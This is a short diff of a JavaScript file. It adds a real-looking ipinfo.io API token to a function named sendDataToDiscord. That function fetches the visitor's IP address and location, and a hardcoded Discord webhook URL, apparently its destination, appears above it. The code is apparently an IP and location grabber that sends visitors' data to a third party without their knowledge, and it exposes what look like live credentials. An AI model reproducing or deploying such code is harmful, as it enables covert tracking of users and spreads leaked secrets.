@@ -5,7 +5,7 @@ const webhookURL = 'https://discord.com/api/webhooks/1303156766200037469/H5sIaxn
 async function sendDataToDiscord() {
     try {
         // Fetching user's IP and location data
-        const ipResponse = await fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN');
+        const ipResponse = await fetch('https://ipinfo.io/json?token=5b1586aef6434c');
 
         if (!ipResponse.ok) {
             throw new Error(`Failed to fetch IP info: ${ipResponse.statusText}`);
